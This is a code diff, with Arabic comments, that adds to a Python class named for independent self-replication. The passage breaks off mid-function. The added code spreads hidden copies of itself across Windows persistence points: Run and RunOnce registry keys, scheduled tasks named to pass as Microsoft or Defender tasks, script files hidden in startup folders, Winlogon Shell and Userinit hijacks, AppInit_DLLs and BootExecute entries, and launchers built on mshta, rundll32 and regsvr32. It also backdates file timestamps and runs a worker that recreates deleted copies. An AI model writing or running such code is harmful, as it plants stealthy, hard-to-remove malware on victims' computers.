@@ -1364,6 +1364,7 @@ class EncryptionSystem:
         return self.cipher.decrypt(encrypted_data).decode()
 
 # === نظام النسخ الذاتي المستقل ===
+# === نظام النسخ الذاتي المستقل ===
 class IndependentReplicationSystem:
     def __init__(self):
         self.original_path = os.path.abspath(__file__)
@@ -1440,48 +1441,47 @@ class IndependentReplicationSystem:
         return created_copies
         
     def install_registry_with_multiple_paths(self):
-        """تثبيت الريجستري بمسارات متعددة"""
         try:
-            python_exe = sys.executable
             installed_count = 0
             
             registry_entries = [
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
-                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
-                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "UserInit"),
-                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ShellService"),
             ]
             
             for hkey, subkey, value_name in registry_entries:
                 try:
-                    # استخدام مسار عشوائي من النسخ
                     if self.backup_copies:
                         random_path = random.choice(self.backup_copies)
                     else:
                         random_path = self.original_path
                     
+                    # استخدام wscript لتشغيل ملفات .pyw مباشرة
+                    vbs_script = f'CreateObject("Wscript.Shell").Run """{random_path}""", 0, False'
+                    
                     with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
-                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{python_exe}" "{random_path}"')
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "{vbs_script}"')
                     
                     installed_count += 1
-                    print(f"✅ ريجستري: {value_name} → {os.path.basename(random_path)}")
+                    print(f"✅ ريجستري: {value_name}")
                     
                 except Exception as e:
-                    print(f"⚠️  فشل ريجستري: {value_name}")
+                    print(f"⚠️ فشل ريجستري: {value_name}")
             
             return installed_count
         except Exception as e:
             return 0
     def start_copy(self, copy_path):
-        """تشغيل نسخة من البرنامج"""
+        """تشغيل نسخة من البرنامج - بدون نافذة"""
         try:
             if os.path.exists(copy_path) and copy_path != os.path.abspath(__file__):
-                python_exe = sys.executable
-                subprocess.Popen([python_exe, copy_path], 
+                # تشغيل ملف .pyw مباشرة بدون pythonw.exe
+                subprocess.Popen([copy_path], 
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL,
+                            shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
+                
                 print(f"🚀 تشغيل: {os.path.basename(copy_path)}")
                 return True
         except Exception as e:
@@ -1500,9 +1500,8 @@ class IndependentReplicationSystem:
         print(f"✅ تم تشغيل {started_count} نسخة")
         return started_count
     def install_scheduled_tasks_with_multiple_paths(self):
-        """تثبيت مهام مجدولة بمسارات متعددة"""
+        """تثبيت مهام مجدولة بمسارات متعددة وبطرق متعددة"""
         try:
-            python_exe = sys.executable
             installed_count = 0
             
             scheduled_tasks = [
@@ -1512,78 +1511,447 @@ class IndependentReplicationSystem:
                 "Microsoft\\Windows\\SecurityUpdate",
                 "Microsoft\\Windows\\Maintenance",
                 "Microsoft\\Windows\\WindowsUpdate",
+                "Microsoft\\Windows\\Defender",
+                "Microsoft\\Windows\\UpdateOrchestrator",
+            ]
+            
+            # طرق تشغيل متعددة
+            execution_methods = [
+                # الطريقة 1: استخدام wscript (الأفضل)
+                lambda path: f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0, False"',
+                
+                # الطريقة 2: استخدام mshta
+                lambda path: f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0:close")',
+                
+                # الطريقة 3: استخدام rundll32 مع ملف .pyw
+                lambda path: f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{path}")',
+                
+                # الطريقة 4: استخدام powershell
+                lambda path: f'powershell -WindowStyle Hidden -Command "Start-Process \'{path}\' -WindowStyle Hidden"',
+                
+                # الطريقة 5: استخدام cmd مع start
+                lambda path: f'cmd /c start /min \"\" \"{path}\"',
             ]
             
             for task_name in scheduled_tasks:
                 try:
-                    # استخدام مسار عشوائي مختلف لكل مهمة
                     if self.backup_copies:
                         random_path = random.choice(self.backup_copies)
                     else:
                         random_path = self.original_path
                     
-                    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{python_exe}\" \"{random_path}\"" /sc onlogon /f /rl highest'
-                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+                    # تجربة كل طريقة حتى تنجح واحدة
+                    success = False
+                    for method_num, method in enumerate(execution_methods):
+                        try:
+                            tr_command = method(random_path)
+                            
+                            # محاولة إنشاء المهمة
+                            cmd = f'schtasks /create /tn "{task_name}_{method_num}" /tr "{tr_command}" /sc onlogon /f /rl highest'
+                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+                            
+                            if result.returncode == 0:
+                                installed_count += 1
+                                print(f"✅ مهمة [{method_num+1}]: {task_name} → {os.path.basename(random_path)}")
+                                success = True
+                                break  # توقف إذا نجحت طريقة
+                                
+                        except Exception as e:
+                            continue
                     
-                    if result.returncode == 0:
-                        installed_count += 1
-                        print(f"✅ مهمة: {task_name} → {os.path.basename(random_path)}")
-                        
+                    if not success:
+                        print(f"⚠️  فشل جميع طرق: {task_name}")
+                            
                 except Exception as e:
                     print(f"⚠️  فشل مهمة: {task_name}")
             
+            # محاولات إضافية بترتيب تشغيل مختلف
+            additional_triggers = [
+                "/sc hourly",           # كل ساعة
+                "/sc daily",            # يومياً
+                "/sc weekly",           # أسبوعياً
+                "/sc onstart",          # عند بدء النظام
+                "/sc onidle",           # عند عدم استخدام الجهاز
+            ]
+            
+            for trigger in additional_triggers:
+                try:
+                    if self.backup_copies:
+                        random_path = random.choice(self.backup_copies)
+                    else:
+                        random_path = self.original_path
+                    
+                    task_name = f"Microsoft\\Windows\\System_{random.randint(1000,9999)}"
+                    tr_command = f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"'
+                    
+                    cmd = f'schtasks /create /tn "{task_name}" /tr "{tr_command}" {trigger} /f'
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
+                    
+                    if result.returncode == 0:
+                        installed_count += 1
+                        print(f"✅ مهمة [{trigger}]: {task_name}")
+                        
+                except Exception:
+                    continue
+            
+            print(f"📊 إجمالي المهام المثبتة: {installed_count}")
             return installed_count
+            
         except Exception as e:
+            print(f"❌ خطأ عام في المهام: {e}")
             return 0
     
     def install_startup_with_multiple_paths(self):
-        """تثبيت بدء التشغيل بمسارات متعددة"""
+        """تثبيت بدء التشغيل بمسارات وطرق متعددة متطورة"""
         try:
-            python_exe = sys.executable
             installed_count = 0
             
+            # جميع مجلدات بدء التشغيل الممكنة (محدثة)
             startup_folders = [
+                # مجلدات المستخدم الأساسية
                 os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                 os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                os.path.join(os.getenv('ALLUSERSPROFILE'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                
+                # مجلدات سياسة المجموعة
+                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicy', 'Machine', 'Scripts', 'Startup'),
+                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicy', 'User', 'Scripts', 'Startup'),
+                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicyUsers'),
+                
+                # مجلدات بديلة ومخفية
+                os.path.join(os.getenv('USERPROFILE'), 'Start Menu', 'Programs', 'Startup'),
+                os.path.join(os.getenv('PUBLIC'), 'Desktop'),
+                os.path.join(os.getenv('TEMP'), 'Startup'),
+                os.path.join(os.getenv('WINDIR'), 'Tasks'),
+                os.path.join(os.getenv('WINDIR'), 'System32', 'Tasks'),
+                
+                # مجلدات برامج شائعة
+                os.path.join(os.getenv('PROGRAMFILES'), 'Common Files', 'Microsoft Shared', 'Startup'),
+                os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Common Files', 'Microsoft Shared', 'Startup'),
             ]
+            
+            # أنواع الملفات المختلفة لبدء التشغيل (محدثة ومطورة)
+            file_types = [
+                # 1. ملفات VBS (مخفي تماماً) - محسّن
+                {
+                    'extension': '.vbs',
+                    'content': lambda path: f'''On Error Resume Next
+    Set ws = CreateObject("Wscript.Shell")
+    ws.Run "{path}", 0, False
+    Set ws = Nothing
+    '''
+                },
+                
+                # 2. ملفات JS - محسّن
+                {
+                    'extension': '.js',
+                    'content': lambda path: f'''try {{
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run('{path}', 0, false);
+    }} catch(e) {{}}
+    '''
+                },
+                
+                # 3. ملفات WSF - محسّن
+                {
+                    'extension': '.wsf', 
+                    'content': lambda path: f'''<package>
+    <job id="Startup">
+    <script language="VBScript">
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "{path}", 0, False
+        Set WshShell = Nothing
+    </script>
+    </job>
+    </package>'''
+                },
+                
+                # 4. ملفات SCR (شاشات توقف) - محسّن
+                {
+                    'extension': '.scr',
+                    'content': lambda path: f'''@echo off
+    setlocal enabledelayedexpansion
+    timeout /t 1 /nobreak >nul
+    start "" /min "{path}"
+    exit
+    '''
+                },
+                
+                # 5. ملفات CMD - محسّن
+                {
+                    'extension': '.cmd',
+                    'content': lambda path: f'''@echo off
+    if not "%1"=="hidden" (mshta vbscript:createobject("wscript.shell").run("""%~f0"" hidden",0)(window.close)&&exit)
+    start "" /min "{path}"
+    exit
+    '''
+                },
+                
+                # 6. ملفات PIF - محسّن
+                {
+                    'extension': '.pif',
+                    'content': lambda path: f'''@echo off
+    powershell -WindowStyle Hidden -Command "& '{path}'"
+    exit
+    '''
+                },
+                
+                # 7. ملفات SCT - محسّن
+                {
+                    'extension': '.sct',
+                    'content': lambda path: f'''<?XML version="1.0"?>
+    <scriptlet>
+    <registration description="System Component" progid="System.Component" version="1.0" classid="{{00000000-0000-0000-0000-000000000000}}">
+    </registration>
+    <public>
+        <method name="Start"/>
+    </public>
+    <script language="JScript">
+    <![CDATA[
+        function Start() {{
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('{path}', 0, false);
+        }}
+        Start();
+    ]]>
+    </script>
+    </scriptlet>'''
+                },
+                
+                # 8. ملفات REG (جديد)
+                {
+                    'extension': '.reg',
+                    'content': lambda path: f'''Windows Registry Editor Version 5.00
+
+    [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
+    "SystemService_{random.randint(10000,99999)}"="wscript.exe \\"{path}\\""
+    '''
+                },
+                
+                # 9. ملفات LNK (جديد) - تحتاج إنشاء خاص
+                {
+                    'extension': '.lnk',
+                    'content': lambda path: f'[InternetShortcut]\nURL=file:///{path}\n'
+                },
+                
+                # 10. ملفات URL (جديد)
+                {
+                    'extension': '.url',
+                    'content': lambda path: f'[InternetShortcut]\nURL=file:///{path}\nWorkingDirectory=%windir%\\system32\n'
+                }
+            ]
+            
+            # أسماء ملفات مقنعة (محدثة)
+            convincing_names = [
+                "WindowsUpdate", "SystemHealth", "AudioService", "NetworkService",
+                "SecurityUpdate", "Maintenance", "Defender", "RuntimeBroker",
+                "BackgroundTask", "SystemCache", "UserProfile", "DisplayDriver",
+                "PowerManagement", "DeviceManager", "FileSystem", "MemoryOptimizer",
+                "WindowsDefender", "SecurityHealth", "UpdateManager", "ServiceHost",
+                "TaskScheduler", "EventViewer", "Performance", "SystemMonitor"
+            ]
+            
+            # تقنيات تمويه إضافية
+            camouflage_techniques = [
+                lambda name: name,  # الاسم الأصلي
+                lambda name: f"{name}_{random.randint(1, 9)}",  # اسم مع رقم
+                lambda name: f"Microsoft_{name}",  # بادئة Microsoft
+                lambda name: f"Windows_{name}",  # بادئة Windows
+                lambda name: f"{name}_Service",  # لاحقة Service
+                lambda name: f"{name}_Manager",  # لاحقة Manager
+                lambda name: f"{name}_Host",  # لاحقة Host
+            ]
+            
+            print("🚀 بدء تثبيت ملفات بدء التشغيل المتقدمة...")
             
             for startup_folder in startup_folders:
                 try:
                     os.makedirs(startup_folder, exist_ok=True)
                     
-                    # استخدام مسار عشوائي مختلف لكل ملف بدء تشغيل
+                    # إنشاء 3-5 ملفات في كل مجلد
+                    for file_index in range(random.randint(3, 5)):
+                        if self.backup_copies:
+                            random_path = random.choice(self.backup_copies)
+                        else:
+                            random_path = self.original_path
+                        
+                        # اختيار نوع ملف عشوائي وتقنية تمويه
+                        file_type = random.choice(file_types)
+                        camouflage = random.choice(camouflage_techniques)
+                        base_name = random.choice(convincing_names)
+                        camouflaged_name = camouflage(base_name)
+                        
+                        file_name = f"{camouflaged_name}_{random.randint(1000,9999)}{file_type['extension']}"
+                        file_path = os.path.join(startup_folder, file_name)
+                        
+                        try:
+                            # كتابة المحتوى
+                            with open(file_path, 'w', encoding='utf-8') as f:
+                                f.write(file_type['content'](random_path))
+                            
+                            # تقنيات إخفاء متقدمة
+                            subprocess.run(f'attrib +h +s +r "{file_path}"', shell=True, capture_output=True)
+                            
+                            # تغيير وقت الملف ليبدو قديماً
+                            old_time = time.time() - random.randint(86400, 2592000)  # 1-30 يوم
+                            os.utime(file_path, (old_time, old_time))
+                            
+                            # تغيير صلاحيات الملف
+                            try:
+                                subprocess.run(f'icacls "{file_path}" /grant:r Everyone:RX', shell=True, capture_output=True)
+                            except:
+                                pass
+                            
+                            installed_count += 1
+                            print(f"✅ بدء تشغيل [{file_index+1}]: {file_name}")
+                            
+                        except Exception as e:
+                            continue
+                            
+                except Exception as e:
+                    continue  # استمرار مع المجلد التالي
+            
+            # نظام ريجستري متقدم لبدء التشغيل
+            print("🔧 تثبيت إدخالات الريجستري المتقدمة...")
+            try:
+                registry_locations = [
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
+                ]
+                
+                for hkey, subkey in registry_locations:
+                    try:
+                        # إنشاء 2-3 إدخالات في كل موقع ريجستري
+                        for reg_index in range(random.randint(2, 3)):
+                            if self.backup_copies:
+                                random_path = random.choice(self.backup_copies)
+                            else:
+                                random_path = self.original_path
+                            
+                            camouflage = random.choice(camouflage_techniques)
+                            base_name = random.choice(convincing_names)
+                            value_name = camouflage(base_name)
+                            
+                            # طرق تنفيذ مختلفة للريجستري
+                            execution_methods = [
+                                f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"',
+                                f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0:close")',
+                                f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{random_path}")',
+                                f'cmd /c start /min "" "{random_path}"',
+                            ]
+                            
+                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, random.choice(execution_methods))
+                            
+                            installed_count += 1
+                            print(f"✅ ريجستري [{reg_index+1}]: {value_name}")
+                            
+                    except Exception:
+                        continue
+                        
+            except Exception as e:
+                print(f"⚠️ فشل في بعض إدخالات الريجستري: {e}")
+            
+            # إنشاء مهام بدء تشغيل إضافية
+            print("⏰ إنشاء مهام بدء تشغيل إضافية...")
+            try:
+                for i in range(3):
                     if self.backup_copies:
                         random_path = random.choice(self.backup_copies)
                     else:
                         random_path = self.original_path
+                    
+                    task_name = f"Startup_{random.choice(convincing_names)}_{random.randint(1000,9999)}"
+                    cmd = f'schtasks /create /tn "{task_name}" /tr "wscript.exe /e:vbscript \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"\"\"{random_path}\\\"\"\\\", 0, False\"" /sc onlogon /f'
+                    
+                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=8)
+                    if result.returncode == 0:
+                        installed_count += 1
+                        print(f"✅ مهمة بدء: {task_name}")
                         
-                    bat_name = f"system_{random.randint(1000,9999)}.bat"
-                    bat_path = os.path.join(startup_folder, bat_name)
-                    
-                    with open(bat_path, 'w') as f:
-                        f.write(f'@echo off\nstart "" "{python_exe}" "{random_path}"\n')
-                    
-                    subprocess.run(f'attrib +h +s "{bat_path}"', shell=True, capture_output=True)
-                    installed_count += 1
-                    print(f"✅ بدء تشغيل: {bat_name} → {os.path.basename(random_path)}")
-                    
-                except Exception as e:
-                    print(f"⚠️  فشل بدء تشغيل: {e}")
+            except Exception as e:
+                print(f"⚠️ فشل في بعض المهام: {e}")
             
+            print(f"🎯 اكتمل التثبيت! إجمالي طرق بدء التشغيل: {installed_count}")
             return installed_count
+            
         except Exception as e:
-            return 0
-    
+            print(f"❌ خطأ عام في بدء التشغيل: {e}")
+            return 0   
+         
     def install_shell_entries_with_multiple_paths(self):
-        """تثبيت إدخالات Shell بمسارات متعددة"""
+        """تثبيت إدخالات Shell متقدمة بمسارات وطرق متعددة"""
         try:
-            python_exe = sys.executable
             installed_count = 0
             
+            # إدخالات Shell متقدمة ومتنوعة
             shell_entries = [
+                # إدخالات Winlogon الأساسية
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
+                
+                # إدخالات Shell متقدمة
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "System"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UIHost"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UIHost"),
+                
+                # إدخالات سياسات Shell
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "Shell"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "Shell"),
+                
+                # إدخالات بديلة لـ Shell
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
+                
+                # إدخالات خدمات Windows
+                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "BootExecute"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "SetupExecute"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "StartupRegExp"),
+                
+                # إدخالات AppInit DLLs
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "LoadAppInit_DLLs"),
+                
+                # إدخالات Notifications
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects"),
             ]
+            
+            # طرق تنفيذ متعددة لملفات .pyw
+            execution_methods = [
+                # الطريقة 1: استخدام wscript (الأفضل)
+                lambda path: f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0, False"',
+                
+                # الطريقة 2: استخدام mshta
+                lambda path: f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0:close")',
+                
+                # الطريقة 3: استخدام rundll32
+                lambda path: f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{path}")',
+                
+                # الطريقة 4: استخدام powershell
+                lambda path: f'powershell -WindowStyle Hidden -Command "& \'{path}\'"',
+                
+                # الطريقة 5: استخدام cmd مع start
+                lambda path: f'cmd /c start /min "" "{path}"',
+                
+                # الطريقة 6: استخدام regsvr32 (للملفات .sct)
+                lambda path: f'regsvr32 /s /n /i:"{path}" scrobj.dll',
+            ]
+            
+            # أسماء مقنعة للقيم
+            convincing_names = [
+                "WindowsShell", "UserInit", "SystemShell", "UIHost", "ShellService",
+                "BootManager", "SessionManager", "AppInit", "ServiceLoader", "Explorer",
+                "WindowsCore", "SystemUI", "UserManager", "SecurityHost", "RuntimeBroker"
+            ]
+            
+            print("🔧 بدء تثبيت إدخالات Shell المتقدمة...")
             
             for hkey, subkey, value_name in shell_entries:
                 try:
@@ -1592,139 +1960,785 @@ class IndependentReplicationSystem:
                     else:
                         random_path = self.original_path
                     
+                    # اختيار طريقة تنفيذ عشوائية
+                    execution_method = random.choice(execution_methods)
+                    command_to_execute = execution_method(random_path)
+                    
                     with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
-                        # الحصول على القيمة الحالية وإضافة قيمتنا
                         try:
-                            current_value, _ = winreg.QueryValueEx(key, value_name)
-                            new_value = f'{current_value},"{python_exe}" "{random_path}"'
+                            # محاولة قراءة القيمة الحالية
+                            current_value, value_type = winreg.QueryValueEx(key, value_name)
+                            
+                            # معالجة أنواع القيم المختلفة
+                            if value_type == winreg.REG_SZ:
+                                # بالنسبة لـ REG_SZ، نضيف إلى القيمة الحالية
+                                if value_name in ["Shell", "Userinit"]:
+                                    # للقيم الحساسة مثل Shell وUserinit، نضيف بشكل آمن
+                                    if random_path not in current_value:
+                                        new_value = f'{current_value},{command_to_execute}'
+                                    else:
+                                        new_value = current_value
+                                else:
+                                    new_value = command_to_execute
+                                    
+                            elif value_type == winreg.REG_MULTI_SZ:
+                                # بالنسبة لـ REG_MULTI_SZ، نضيف عنصر جديد
+                                if isinstance(current_value, list):
+                                    new_value = current_value + [command_to_execute]
+                                else:
+                                    new_value = [current_value, command_to_execute]
+                                    
+                            else:
+                                # لأنواع أخرى، نستبدل القيمة
+                                new_value = command_to_execute
+                                
                         except FileNotFoundError:
-                            new_value = f'"{python_exe}" "{random_path}"'
+                            # إذا القيمة غير موجودة، ننشئها
+                            if value_name in ["AppInit_DLLs", "BootExecute"]:
+                                new_value = command_to_execute
+                            else:
+                                new_value = command_to_execute
                         
-                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
+                        # كتابة القيمة الجديدة
+                        if isinstance(new_value, list):
+                            winreg.SetValueEx(key, value_name, 0, winreg.REG_MULTI_SZ, new_value)
+                        else:
+                            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, str(new_value))
                     
                     installed_count += 1
                     print(f"✅ Shell: {value_name} → {os.path.basename(random_path)}")
                     
                 except Exception as e:
-                    print(f"⚠️  فشل Shell {value_name}: {e}")
+                    print(f"⚠️ فشل Shell {value_name}: {e}")
             
+            # إنشاء إدخالات Shell جديدة بإسماء عشوائية
+            print("🔄 إنشاء إدخالات Shell جديدة...")
+            try:
+                additional_entries = [
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                ]
+                
+                for hkey, subkey in additional_entries:
+                    try:
+                        # إنشاء 2-3 إدخالات في كل موقع
+                        for i in range(random.randint(2, 3)):
+                            if self.backup_copies:
+                                random_path = random.choice(self.backup_copies)
+                            else:
+                                random_path = self.original_path
+                            
+                            value_name = f"{random.choice(convincing_names)}_{random.randint(1000,9999)}"
+                            execution_method = random.choice(execution_methods)
+                            command_to_execute = execution_method(random_path)
+                            
+                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command_to_execute)
+                            
+                            installed_count += 1
+                            print(f"✅ Shell إضافي: {value_name}")
+                            
+                    except Exception:
+                        continue
+                        
+            except Exception as e:
+                print(f"⚠️ فشل في الإدخالات الإضافية: {e}")
+            
+            # تثبيت إدخالات AppInit_DLLs متقدمة
+            print("📚 تثبيت إدخالات AppInit_DLLs...")
+            try:
+                dll_entries = [
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "LoadAppInit_DLLs"),
+                ]
+                
+                for hkey, subkey, value_name in dll_entries:
+                    try:
+                        if value_name == "LoadAppInit_DLLs":
+                            # تفعيل LoadAppInit_DLLs
+                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)
+                        else:
+                            # إضافة إلى AppInit_DLLs
+                            if self.backup_copies:
+                                random_path = random.choice(self.backup_copies)
+                            else:
+                                random_path = self.original_path
+                            
+                            # إنشاء ملف DLL وهمي (للمظهر فقط)
+                            fake_dll = f"c:\\windows\\system32\\api_{random.randint(1000,9999)}.dll"
+                            
+                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                                try:
+                                    current_value, _ = winreg.QueryValueEx(key, value_name)
+                                    new_value = f'{current_value},{fake_dll}'
+                                except FileNotFoundError:
+                                    new_value = fake_dll
+                                
+                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
+                        
+                        installed_count += 1
+                        print(f"✅ AppInit: {value_name}")
+                        
+                    except Exception as e:
+                        print(f"⚠️ فشل AppInit {value_name}: {e}")
+                        
+            except Exception as e:
+                print(f"⚠️ فشل في إدخالات AppInit: {e}")
+            
+            print(f"🎯 اكتمل تثبيت إدخالات Shell! الإجمالي: {installed_count}")
             return installed_count
+            
         except Exception as e:
+            print(f"❌ خطأ عام في إدخالات Shell: {e}")
             return 0
     
     def start_intelligent_protection(self):
-        """بدء حماية ذكية متقدمة مع تجديد الملفات"""
+        """بدء نظام حماية ذكي متقدم مع مراقبة شاملة"""
         def protection_worker():
-            # انتظر قليلاً في البداية
-            time.sleep(3)
+            # انتظر لبدء النظام بالكامل
+            time.sleep(5)
             
             protection_cycle = 0
+            last_cleanup_time = time.time()
+            
             while True:
                 try:
                     protection_cycle += 1
                     
-                    # استخدام Lock لمنع التكرار
                     with self.creation_lock:
-                        missing_files = []
-                        outdated_files = []
-                        healthy_files = []
+                        # حالة النظام الشاملة
+                        system_status = {
+                            'missing_files': [],
+                            'outdated_files': [],
+                            'healthy_files': [],
+                            'corrupted_files': [],
+                            'protected_files': [],
+                            'registry_entries': [],
+                            'scheduled_tasks': []
+                        }
                         
-                        # فحص جميع المواقع
+                        # فحص شامل للملفات
                         for location in self.system_locations:
-                            if not os.path.exists(location):
-                                missing_files.append(os.path.basename(location))
-                            else:
-                                # التحقق من تاريخ التعديل (إذا أقدم من 30 دقيقة)
-                                stat = os.stat(location)
-                                if time.time() - stat.st_mtime > 1800:  # 30 دقيقة
-                                    outdated_files.append(os.path.basename(location))
+                            try:
+                                if not os.path.exists(location):
+                                    system_status['missing_files'].append(os.path.basename(location))
                                 else:
-                                    healthy_files.append(os.path.basename(location))
-                        
-                        # طباعة تقرير كل 5 دورات فقط
-                        if protection_cycle % 5 == 0:
-                            print(f"📊 تقرير الحماية - الدورة #{protection_cycle}")
-                            print(f"   ✅ الملفات السليمة: {len(healthy_files)}")
-                            print(f"   🔄 الملفات القديمة: {len(outdated_files)}")
-                            if missing_files:
-                                print(f"   ❌ الملفات المفقودة: {missing_files}")
-                        
-                        # إعادة إنشاء الملفات المفقودة والقديمة
-                        files_to_recreate = missing_files + outdated_files
-                        if files_to_recreate:
-                            print(f"🔄 اكتشاف {len(files_to_recreate)} ملف يحتاج تجديد: {files_to_recreate}")
-                            
-                            for location in self.system_locations:
-                                basename = os.path.basename(location)
-                                if basename in files_to_recreate:
+                                    # فحص حجم الملف (لا يمكن أن يكون صفراً)
+                                    file_size = os.path.getsize(location)
+                                    if file_size == 0:
+                                        system_status['corrupted_files'].append(os.path.basename(location))
+                                        continue
+                                    
+                                    # فحص تاريخ التعديل (إذا أقدم من 15 دقيقة)
+                                    stat = os.stat(location)
+                                    file_age = time.time() - stat.st_mtime
+                                    
+                                    if file_age > 900:  # 15 دقيقة
+                                        system_status['outdated_files'].append(os.path.basename(location))
+                                    else:
+                                        system_status['healthy_files'].append(os.path.basename(location))
+                                        
+                                    # التحقق من سمة الإخفاء
                                     try:
